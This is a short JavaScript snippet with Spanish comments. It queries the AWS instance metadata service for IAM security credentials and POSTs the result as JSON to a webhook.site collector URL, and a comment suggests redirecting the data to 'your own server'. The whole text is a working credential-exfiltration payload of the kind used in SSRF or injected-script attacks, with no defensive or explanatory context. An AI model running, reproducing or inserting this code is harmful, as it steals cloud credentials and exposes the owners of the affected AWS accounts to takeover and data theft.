fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/')
  .then(response => response.text())
  .then(data => {
    console.log(data); // Procesar la respuesta como desees
    // O redirigirla a tu propio servidor
    fetch('https://webhook.site/6542d7e5-8175-4ce9-96e9-9b731d157fa4/read', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ metadata: data })
    });
  })
  .catch(error => console.error('Error al acceder a la metadata de AWS:', error));
